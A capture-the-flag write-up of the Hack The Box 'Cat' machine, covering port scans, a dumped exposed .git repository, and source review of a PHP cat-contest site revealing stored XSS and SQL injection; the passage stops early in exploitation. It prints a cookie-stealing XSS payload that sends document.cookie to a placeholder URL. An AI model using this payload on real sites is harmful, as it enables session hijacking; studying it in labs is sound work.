----------------

### CTF-: Hackthebox
### LAB-: CAT

----------------

![image](https://github.com/user-attachments/assets/aa20ec71-ca90-423e-9de3-403d6e691987)

-----------------

- Rustscan's output-:

```bash
❯ cat rustscan.txt
❯ rustscan -a cat.htb -- -Pn -sC -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/sensei/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.11.53:22
Open 10.10.11.53:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-19 17:39 WAT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:39
Completed NSE at 17:39, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:39
Completed NSE at 17:39, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:39
Completed NSE at 17:39, 0.00s elapsed
Initiating Connect Scan at 17:39
Scanning cat.htb (10.10.11.53) [2 ports]
Discovered open port 22/tcp on 10.10.11.53
Discovered open port 80/tcp on 10.10.11.53
Completed Connect Scan at 17:39, 0.21s elapsed (2 total ports)
Initiating Service scan at 17:39
Scanning 2 services on cat.htb (10.10.11.53)
Completed Service scan at 17:39, 6.43s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.53.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:39
Completed NSE at 17:39, 8.24s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:39
Completed NSE at 17:39, 0.83s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:39
Completed NSE at 17:39, 0.00s elapsed
Nmap scan report for cat.htb (10.10.11.53)
Host is up, received user-set (0.21s latency).
Scanned at 2025-03-19 17:39:17 WAT for 16s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 96:2d:f5:c6:f6:9f:59:60:e5:65:85:ab:49:e4:76:14 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/7/gBYFf93Ljst5b58XeNKd53hjhC57SgmM9qFvMACECVK0r/Z11ho0Z2xy6i9R5dX2G/HAlIfcu6i2QD9lILOnBmSaHZ22HCjjQKzSbbrnlcIcaEZiE011qtkVmtCd2e5zeVUltA9WCD69pco7BM29OU7FlnMN0iRlF8u962CaRnD4jni/zuiG5C2fcrTHWBxc/RIRELrfJpS3AjJCgEptaa7fsH/XfmOHEkNwOL0ZK0/tdbutmcwWf9dDjV6opyg4IK73UNIJSSak0UXHcCpv0GduF3fep3hmjEwkBgTg/EeZO1IekGssI7yCr0VxvJVz/Gav+snOZ/A1inA5EMqYHGK07B41+0rZo+EZZNbuxlNw/YLQAGuC5tOHt896wZ9tnFeqp3CpFdm2rPGUtFW0jogdda1pRmRy5CNQTPDd6kdtdrZYKqHIWfURmzqva7byzQ1YPjhI22cQ49M79A0yf4yOCPrGlNNzeNJkeZM/LU6p7rNJKxE9CuBAEoyh0=
|   256 9e:c4:a4:40:e9:da:cc:62:d1:d6:5a:2f:9e:7b:d4:aa (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEmL+UFD1eC5+aMAOZGipV3cuvXzPFlhqtKj7yVlVwXFN92zXioVTMYVBaivGHf3xmPFInqiVmvsOy3w4TsRja4=
|   256 6e:22:2a:6a:6d:eb:de:19:b7:16:97:c2:7e:89:29:d5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEOCpb672fivSz3OLXzut3bkFzO4l6xH57aWuSu4RikE
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Best Cat Competition
| http-git: 
|   10.10.11.53:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Cat v1 
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Exposed `.git` directory-:

![image](https://github.com/user-attachments/assets/3fbbb6d6-de19-4d62-bd7a-6338fd5f0f80)

- I dumped it with `GitTools'` git dumper tool.

![image](https://github.com/user-attachments/assets/cdaf2b1b-7388-4eb0-acf4-4f44c2782ded)

- I extracted it with `extractor.sh` script in `GITTOOLS`.

![image](https://github.com/user-attachments/assets/f2528bd7-096d-4caf-8684-e22821fdbe28)

- It contains the source code for the `cat` php blog on port `80`.

![image](https://github.com/user-attachments/assets/c011defe-95bb-49f4-b6b2-2febcd384c8d)

-------------------

### SOURCE-CODE REVIEW 

### XSS -TO- SQL

-------------------

- To understand the stored xss,we have to trace it from the `contest.php` page.Vulnerable code-:

```php
$stmt = $pdo->prepare("INSERT INTO cats (cat_name, age, birthdate, weight, photo_path, owner_username) VALUES (:cat_name, :age, :birthdate, :weight, :photo_path, :owner_username)");
                // Bind parameters
                $stmt->bindParam(':cat_name', $cat_name, PDO::PARAM_STR);
                $stmt->bindParam(':age', $age, PDO::PARAM_INT);
                $stmt->bindParam(':birthdate', $birthdate, PDO::PARAM_STR);
                $stmt->bindParam(':weight', $weight, PDO::PARAM_STR);
                $stmt->bindParam(':photo_path', $target_file, PDO::PARAM_STR);
                $stmt->bindParam(':owner_username', $_SESSION['username'], PDO::PARAM_STR);

```
- You will noticed in this line that the `owner_username` gets inserted into the database unfiltered.

```php
$stmt->bindParam(':owner_username', $_SESSION['username'], PDO::PARAM_STR);
```
- And it gets stored when we upload a cat in the contest page and executed when the admin interacts with it.Also, the register page does not filter input.Payload-:

```html
"><script>fetch("<url>"+document.cookie)</script>
```

--------------

### SQL injection-:

---------------

- The `accept_cat.php` page which can only be accessed by the admin is vulnerable to sqli  injection because user input in the `catName` param is directly passed into a sql statement.

```php
if (isset($_SESSION['username']) && $_SESSION['username'] === 'axel') {
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        if (isset($_POST['catId']) && isset($_POST['catName'])) {
            $cat_name = $_POST['catName'];
            $catId = $_POST['catId'];
            $sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
            $pdo->exec($sql_insert);
```

----------------

### Exploitation-:

----------------

- Register a user with the payload-:

![image](https://github.com/user-attachments/assets/289ef9df-267a-41fe-936b-1c8fefdc0fbc)

- Set up a listener to grab the cookie and upload an image on `contest.php`







